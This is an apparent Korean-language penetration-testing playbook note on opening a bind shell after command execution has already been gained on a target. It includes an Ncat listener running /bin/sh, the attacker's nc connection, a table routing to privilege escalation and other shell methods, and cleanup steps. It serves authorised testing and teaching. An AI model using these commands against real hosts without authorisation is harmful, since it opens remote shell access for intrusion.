---
tags:
  - 환경/linux
  - 환경/windows
시작조건: ["대상에서 명령 실행 확보"]
필요권한: ["대상에서 명령 실행 권한"]
필요조건: ["대상 inbound 포트 접근 가능"]
결과: ["세션", "명령 실행"]
---

# Bind Shell 획득

## 한 줄 판단

대상에서 이미 명령을 실행할 수 있고 대상이 새 TCP 포트를 수신하도록 만들 수 있으며 공격 호스트에서 그 포트에 연결할 수 있다면, 대상에 bind shell을 열어 기존 명령 실행 계정의 대화형 세션을 얻는다.

이 기법은 공격 호스트에서 대상의 수신 포트로 연결할 수 있을 때만 사용한다. listener는 한 연결 뒤 종료되는 임시 프로세스이며, 연결 성공은 기존 명령 실행 계정의 셸을 뜻할 뿐 다른 권한이나 지속 접근을 뜻하지 않는다.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| 명령 실행 | RCE/Web Shell | 대상에서 bind 명령 실행 가능 |
| 대상 방향 연결 | 공격 호스트에서 대상의 선택한 TCP 포트 연결 | 중간 방화벽과 대상 방화벽이 연결을 허용 |
| 포트 선택 | 대상에서 `ss -ltnp 'sport = :<PORT>'` | 충돌 없는 포트 |
| Ncat 구현 | `ncat --help`에서 `--listen`·`--exec` 확인 | Nmap Ncat 문법 사용 가능 |

## 실행

### 대상에서 bind shell

이 block은 대상 Linux 호스트에서 실행한다. `<TARGET_BIND_IP>`는 공격 호스트 연결을 받을 대상 인터페이스 IP(가상 예: `198.51.100.20`), `<PORT>`는 작업 전 비어 있는 TCP 포트(가상 예: `4444`)다. `<BIND_SHELL_PID>`는 background command 직후 `$!`에서 얻으며, listener 연결은 실행 계정 identity와 별도다.

```bash
ss -ltnp 'sport = :<PORT>'
ncat --listen <TARGET_BIND_IP> <PORT> --exec /bin/sh &
BIND_SHELL_PID=$!
ps -p "$BIND_SHELL_PID" -o pid,lstart,args
ss -ltnp 'sport = :<PORT>'
```

확인할 출력:

- 대상이 `<TARGET_BIND_IP>:<PORT>`에서 대기하고 `ss -ltnp 'sport = :<PORT>'`의 PID가 `<BIND_SHELL_PID>`와 일치한다.
- Nmap Ncat은 `--exec`를 지원하며 `--keep-open`을 추가하지 않은 이 예시는 한 연결이 끝나면 listener도 종료된다. 다른 `nc` 구현의 `-e` 지원을 가정하지 않는다.

### 공격자에서 접속

이 block은 공격 호스트에서 실행한다. `<TARGET>`·`<PORT>`는 앞 단계 bind 주소·포트를 재사용하며, `nc` 연결 성공은 대상 shell의 사용자·권한 확인 전 상태다.

```bash
nc -nv <TARGET> <PORT>
```

확인할 출력:

- shell prompt 또는 명령 실행 가능.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 공격 호스트에서 대상 bind 포트에 접속해 명령을 실행한다. | bind shell 연결 확인 | 기존 명령 실행 계정의 bind shell 세션 | `whoami`, `id`, `hostname`으로 실행 계정과 호스트 확인 |
| `whoami`, `id`, `hostname` 결과가 나온다. | 명령 실행 컨텍스트 확인 | 명령 실행 | Linux면 [[TTY 업그레이드]], 이후 필요한 로컬 열거로 전환 |
| 연결 거부 | 포트 열기 실패 | 시작 상태 유지 | 대상 명령 실행 결과, 포트 충돌 |
| timeout | 방화벽 차단 | 시작 상태 유지 | reverse shell, Web Shell 유지, WinRM/SSH 전환 |
| `ncat` 또는 `--exec` 사용 불가 | 대상에 Nmap Ncat이 없거나 다른 Netcat 구현임 | 시작 상태 유지 | [[Socat 셸 리디렉션]] 또는 [[Reverse Shell 획득]]으로 전환하고 검증되지 않은 `-e` 문법을 반복하지 않음 |

## 확인할 출력과 권한

- 판정 기준: 대상 listener 상태와 공격자 연결을 모두 확인한 뒤 `whoami`·`id`·`hostname`으로 실행 권한을 판정한다.

## 변경 영향과 복구

연결이 살아 있을 때 bind shell에서 시작한 하위 작업을 먼저 정리하고 `exit`로 client session을 끝낸다. 그 뒤 원래 명령 실행 경로에서 기록한 PID와 포트를 확인한다.

| 변경 대상 | 기존 상태·식별값 | 종료·정리 | 완료 확인 |
|---|---|---|---|
| 대상 bind listener와 shell process | 실행 전 빈 포트, `<BIND_SHELL_PID>`·시작 시각·command line | client의 `exit` 뒤 process가 남아 있을 때만 `ps -p <BIND_SHELL_PID> -o pid,lstart,args`를 대조하고 `kill <BIND_SHELL_PID>` | `ps -p <BIND_SHELL_PID>`에 process가 없고 `ss -ltnp 'sport = :<PORT>'`에 이번 PID가 없음 |
| 별도 전달 파일 | Ncat·script·payload를 반입했다면 그 exact 경로와 hash | listener 종료 확인 뒤 반입 기법의 복구 절차로 이번 파일만 제거 | exact 경로가 없고 기존 파일은 유지됨 |

연결이 먼저 끊겨도 원래 명령 실행 경로가 남아 있으면 PID·시작 시각·command line을 확인해 종료할 수 있다. 원래 경로도 잃었으면 원격 listener 종료를 확인할 수 없으므로 복구 완료로 기록하지 않는다. process 이름이나 포트만으로 기존 listener를 일괄 종료하지 않는다.

## 후속 공격 연결

- [[TTY 업그레이드]]
- [[상황별 파일 전송]]

## 관련 상태 라우터

- 접속한 셸의 플랫폼에 따라 [[Linux 셸 확보 후 초기 열거와 권한 상승]] 또는 [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]

## 관련 도구

- [[netcat]]
- [[powershell]]

## 참고 링크

- [Nmap Ncat Users' Guide: Basic usage](https://nmap.org/ncat/guide/ncat-usage.html)
- [Nmap Ncat Users' Guide: Command execution](https://nmap.org/ncat/guide/ncat-exec.html)
